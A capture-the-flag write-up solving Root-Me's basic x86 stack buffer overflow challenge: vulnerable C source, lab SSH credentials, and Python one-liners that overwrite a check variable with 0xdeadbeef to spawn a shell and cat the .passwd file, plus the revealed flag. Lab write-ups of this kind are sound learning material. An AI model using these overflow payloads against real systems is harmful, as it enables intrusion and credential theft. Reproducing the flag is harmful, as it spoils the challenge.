## Challenge name: ELF x86 - Stack buffer overflow basic 1


<img width="1318" height="336" alt="image" src="https://github.com/user-attachments/assets/04895213-1eda-41e5-b4ab-b2d5693caf9d" />
<br>
<br>

``` Challenge Link:```  **https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1**
<br>
<br>

**Statement - Environment configuration:**

```
+------------------+-----------------------------------------------+
| Protection       | Description                                   |
+------------------+-----------------------------------------------+
| PIE              | Position Independent Executable               |
| RelRO            | Read Only relocations                         |
| NX               | Non-Executable Stack                          |
| Heap exec        | Non-Executable Heap                           |
| ASLR             | Address Space Layout Randomization            |
| SF               | Source Fortification                          |
| SRC              | Source code access                            |
+------------------+-----------------------------------------------+
```

<br>

**Source Code Given:**
```
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{

  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Hell yeah! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

<br>

**Challenge connection informations:**

```
+------------------+-------------------------------------------------------------+
| Field            | Value                                                       |
+------------------+-------------------------------------------------------------+
| Host             | challenge02.root-me.org                                     |
| Protocol         | SSH                                                         |
| Port             | 2222                                                        |
| SSH access       | ssh -p 2222 app-systeme-ch13@challenge02.root-me.org        |
| Username         | app-systeme-ch13                                            |
| Password         | app-systeme-ch13                                            |
+------------------+-------------------------------------------------------------+
```

**Now we will connect to lab via ssh uisng the the creds from challenge connection information.**

<br>
<img width="1318" height="336" alt="image" src="https://github.com/user-attachments/assets/e916b73e-246f-472e-b2bd-901360874b1c" />
<br>
<br>

**After connecting we can see that there is our binary and as you can see there is .passwd and with that binary we can cat it so lets begin.**

<br>
<img width="1318" height="336" alt="image" src="https://github.com/user-attachments/assets/dba806a2-70dd-46e2-90b9-6cb4878af9f0" />
<br>
<br>

**In the code you can see that defined buffer to take input is 40 bytes but giving fgets() 45 bytes say 44 bytes cuz there is \0 null terminator so if we provide it stuffs more than 40 bytes the first if contidion triggers.**

<br>
<img width="1318" height="450" alt="image" src="https://github.com/user-attachments/assets/af7ae160-3edb-47c5-b641-27567065b458" />
<br>
<br>

**Now to reach inside the second if we need to make the value of check equal to 0xdeadbeef. On x86 (little-endian), if you put a value like 0x04030201 in a variable, it is stored in the stack as `01 02 03 04`, but logically the value is still `04 03 02 01` which is simply 01 02 03 04 (non‑little‑endian / big‑endian), meaning 1234. Little‑endian just changes how bytes are placed in memory/stack, not the actual value. Similarly, to set check = 0xdeadbeef, we need to write it in little‑endian order as `ef be ad de`. This does not mean anything in ASCII or OS‑wise, it is just raw hex bytes we need to overwrite the variable in memory to go through that check. So our next payload will be 40 bytes of padding + these 4 bytes of `ef be ad de` overwrite check. Lets use python to do that for simplicity:**


```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\xef\xbe\xad\xde');" | ./ch13
```

<br>
<img width="1333" height="390" alt="image" src="https://github.com/user-attachments/assets/c7e0ce55-2631-462f-971e-32ce047e0d42" />
<br>
<br>

**It said you win and opened the shell runned bash for a sec and closed so when bash is running we have to provide args to bash to view our .passwd file to get flag. Using Payload:**


```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\xef\xbe\xad\xde'); sys.stdout.buffer.flush(); import time; time.sleep(0.2); sys.stdout.write('\ncat .passwd\n'); sys.stdout.flush(); time.sleep(1)" | ./ch13
```

<br>
<img width="1333" height="390" alt="image" src="https://github.com/user-attachments/assets/a874d8d8-d493-41a4-8e29-c605b021b751" />
<br>
<br>

**We can use this "1w4ntm043pr0np1s" as flag/passwd to validate the challenge..** <br>
**Thankyou.**

